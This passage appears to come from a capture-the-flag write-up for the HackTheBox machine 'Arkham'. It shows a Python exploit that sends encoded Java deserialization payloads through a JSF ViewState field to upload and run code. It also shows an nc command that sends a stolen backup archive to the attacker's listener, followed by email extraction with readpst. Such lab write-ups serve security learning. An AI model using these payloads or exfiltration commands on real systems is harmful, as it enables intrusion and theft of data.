class=&quot;nl&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;HTTP Status 500 â Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Type&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; Exception Report&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Message&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;; [Ljava.lang.Object; is in module java.base of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;)&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Description&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Exception&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;pre&amp;gt;&lt;/span&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;; [Ljava.lang.Object; is in module java.base of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;)
        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getSavedState(HtmlResponseStateManager.java:187)
        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getState(HtmlResponseStateManager.java:139)
        org.apache.myfaces.application.jsp.JspStateManagerImpl.restoreView(JspStateManagerImpl.java:355)
        org.apache.myfaces.application.jsp.JspViewHandlerImpl.restoreView(JspViewHandlerImpl.java:515)
        org.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:85)
        org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)
        org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)
        javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)
        org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Note&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; The full stack trace of the root cause is available in the server logs.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Apache Tomcat/8.5.37&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-checked-my-listener-and-&quot;&gt;Then I checked my listener, and :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
&lt;h4 id=&quot;i-also-scripted-this-because-copying-and-pasting-in-burp-wasnt-my-favorite-thing-and-it-only-takes-2-minutes-to-script-this-in-python-&quot;&gt;I also scripted this because copying and pasting in burp wasn’t my favorite thing and it only takes 2 minutes to script this in python :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;j_id_jsp_1623871077_1:email&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;test&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;j_id_jsp_1623871077_1:submit&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SIGN UP&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;j_id_jsp_1623871077_1_SUBMIT&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;javax.faces.ViewState&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.10.130:8080/userSubscribe.faces&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;upload_payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;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&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;execute_payload&lt;/span&gt;	&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;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&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;upload_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;shell-as-batman&quot;&gt;Shell as Batman&lt;/h3&gt;
&lt;h4 id=&quot;we-are-on-the-box-as-alfred-i-enumerated-the-directories-and-found-a-directory-called-backups-in-cusersalfreddownloads-it-had-a-zip-archive-called-backupzip-&quot;&gt;We are on the box as &lt;code class=&quot;highlighter-rouge&quot;&gt;Alfred&lt;/code&gt;, I enumerated the directories and found a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;backups&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Alfred\Downloads&lt;/code&gt;, It had a &lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt; archive called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup.zip&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Alfred\Downloads&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FA90-3873

 Directory of C:\Users\Alfred\Downloads

02/03/2019  08:48 AM    &amp;lt;DIR&amp;gt;          .
02/03/2019  08:48 AM    &amp;lt;DIR&amp;gt;          ..
02/03/2019  08:41 AM    &amp;lt;DIR&amp;gt;          backups
               0 File(s)              0 bytes
               3 Dir(s)   8,675,921,920 bytes free

C:\Users\Alfred\Downloads&amp;gt;cd backups
cd backups

C:\Users\Alfred\Downloads\backups&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FA90-3873

 Directory of C:\Users\Alfred\Downloads\backups

02/03/2019  08:41 AM    &amp;lt;DIR&amp;gt;          .
02/03/2019  08:41 AM    &amp;lt;DIR&amp;gt;          ..
02/03/2019  08:41 AM           124,257 backup.zip
               1 File(s)        124,257 bytes
               2 Dir(s)   8,675,921,920 bytes free

C:\Users\Alfred\Downloads\backups&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-wanted-to-get-it-on-my-box-so-i-used-nc-to-do-it-i-listened-on-port-1338-then-on-the-box-i-did-this&quot;&gt;I wanted to get it on my box so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; to do it. I listened on port 1338, then on the box I did this:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Alfred\Downloads\backups&amp;gt;C:\windows\system32\spool\drivers\color\nc.exe -w 3 10.10.xx.xx 1338 &amp;lt; C:\Users\Alfred\Downloads\backups\backup.zip                                                             
C:\windows\system32\spool\drivers\color\nc.exe -w 3 10.10.xx.xx 1338 &amp;lt; C:\Users\Alfred\Downloads\backups\backup.zip                                                                                   
C:\Users\Alfred\Downloads\backups&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-i-successfully-got-the-file-&quot;&gt;And I successfully got the file :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/backups# nc -lp 1338 &amp;gt; backup.zip                                                                    
root@kali:~/Desktop/HTB/boxes/arkham/backups# ls -la
total 132
drwxr-xr-x 2 root root   4096 Aug  9 21:26 .
drwxr-xr-x 5 root root   4096 Aug  9 21:24 ..
-rw-r--r-- 1 root root 124257 Aug  9 21:26 backup.zip
root@kali:~/Desktop/HTB/boxes/arkham/backups#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-archive-only-had-a-file-called-alfredarkhamlocalost-which-is-an-outlook-email-folder-so-i-used-readpst-to-convert-it&quot;&gt;The archive only had a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;alfred@arkham.local.ost&lt;/code&gt; which is an outlook email folder so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;readpst&lt;/code&gt; to convert it.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/backups# unzip backup.zip 
Archive:  backup.zip
  inflating: alfred@arkham.local.ost  
root@kali:~/Desktop/HTB/boxes/arkham/backups# file alfred@arkham.local.ost 
alfred@arkham.local.ost: Microsoft Outlook email folder
root@kali:~/Desktop/HTB/boxes/arkham/backups# readpst alfred@arkham.local.ost 
Opening PST file and indexes...
Processing Folder &quot;Deleted Items&quot;
Processing Folder &quot;Inbox&quot;
Processing Folder &quot;Outbox&quot;
Processing Folder &quot;Sent Items&quot;
Processing Folder &quot;Calendar&quot;
Processing Folder &quot;Contacts&quot;
Processing Folder &quot;Conversation Action Settings&quot;
Processing Folder &quot;Drafts&quot;
Processing Folder &quot;Journal&quot;
Processing Folder &quot;Junk E-Mail&quot;
Processing Folder &quot;Notes&quot;
Processing Folder &quot;Tasks&quot;
Processing Folder &quot;Sync Issues&quot;
Processing Folder &quot;RSS Feeds&quot;
Processing Folder &quot;Quick Step Settings&quot;
  &quot;alfred@arkham.local.ost&quot; - 15 items done, 0 items skipped.
  &quot;Calendar&quot; - 0 items done, 3 items skipped.
Processing Folder &quot;Conflicts&quot;
Processing Folder &quot;Local Failures&quot;
Processing Folder &quot;Server Failures&quot;
  &quot;Sync Issues&quot; - 3 items done, 0 items skipped.
  &quot;Inbox&quot; - 0 items done, 7 items skipped.
  &quot;Drafts&quot; - 1 items done, 0 items skipped.
root@kali:~/Desktop/HTB/boxes/arkham/backups# 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-output-was-saved-in-draftsmbox-i-removed-the-long-useless-output-&quot;&gt;The output was saved in &lt;code class=&quot;highlighter-rouge&quot;&gt;Drafts.mbox&lt;/code&gt;, I removed the long useless output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/arkham/backups# ls -la
total 16608
drwxr-xr-x 2 root root     4096 Aug  9 21:33 .
drwxr-xr-x 5 root root     4096 Aug  9 21:33 ..
-rwx------ 1 root root 16818176 Feb  3  2019 alfred@arkham.local.ost
-rw-r--r-- 1 root root   124257 Aug  9 21:26 backup.zip
-rw-r--r-- 1 root root    51857 Aug  9 21:33 Drafts.mbox
root@kali:~/Desktop/HTB/boxes/arkham/backups# cat Drafts.mbox 
   ----------------
    Removed Output
   ----------------
&amp;lt;/o:shapelayout&amp;gt;&amp;lt;/xml&amp;gt;&amp;lt;![endif]--&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body lang=EN-US link=&quot;#0563C1&quot; vlink=&quot;#954F72&quot; style='tab-interval:.5in'&amp;gt;&amp;lt;div class=WordSection1&amp;gt;&amp;lt;p class=MsoNormal&amp;gt;Master Wayne stop forgetting your password&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=MsoNormal&amp;gt;&amp;lt;o:p&amp;gt;&amp;amp;nbsp;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p class=MsoNormal&amp;gt;&amp;lt;span style='mso-no-proof:yes'&amp;gt;&amp;lt;img width=677 height=343 id=&quot;Picture_x0020_1&quot; src=&quot;cid:image001.png@01D4BB4A.F5061EA0&quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
----boundary-LibPST-iamunique-672158152_-_-
Content-Type: image/png
Content-Transfer-Encoding: base64
Content-ID: &amp;lt;image001.png@01D4BB4A.F5061EA0&amp;gt;
Content-Disposition: attachment; 
        filename*=utf-8''image001.png;
        filename=&quot;image001.png&quot;

iVBORw0KGgoAAAANSUhEUgAAAqUAAAFXCAIAAAAUCKDqAAAAAXNSR0IArs4c6QAAJwVJREFUeF7t
3V+oZdd5GPCjUmibujISRUNh5GhiCya2hI0lVXSoEwXXCRMoqpUXyzR6MFaUIlwh2S9+kB+sB7/Y
ElNjWskmDzJ0/FKpItCBGDGSBROGKMYgoaqM3XEsQZBpLazUTelLu8/Z9+677/679jn7O3edO7/L
IEbn7v2tb/2+dfa3/5w797qPfuyOhS8CBAgQIEDgWAtcV/T7u7994VjP0eQIECBAYIcF/vKPz97x
H2buU/PG/N+P/MuHbvknORA//dO//rVzf9rO5PKDZ/9ODvnJgQABAgQIEAgV0O9DeQUnQIAAAQJZ
COj3WZRBEgQIECBAIFRAvw/lFZwAAQIECGQhoN9nUQZJECBAgACBUAH9PpRXcAIECBDYMYFn7rpp
4M+8k/nEf/zP5Z8qbPuVuUbU7+eSFIcAAQIECEwTeOWz/6rcoWz5VeOvXp8WbnBr/X5GTKEIECBA
4JgI/NFf/LzxJ2hijZZfjBLR7IuwSf3+N//8P036E4QiLAECBAgQOH4C9QYf1OxT+32x3b/4vbN9
f/7bX//f4lvVf49fJcxoJwTeO//7tUduX3rrIOkXf3DX77/+9qFJvPW1m5752ov1l5avfO7p92ov
Vdss/3JXPeC4xzKZw/HH9xnfomMi4zttbYtLX6r8Xzh/9WDY2uv7JuETifHfGqWBCIQIJF3fFyP/
7d/8z74/n/uDf158q/pvSJqCEhgSuPr652763pMfPlvdfzu3uHqp2uGTp+579Sev1DrQYnHzbz+w
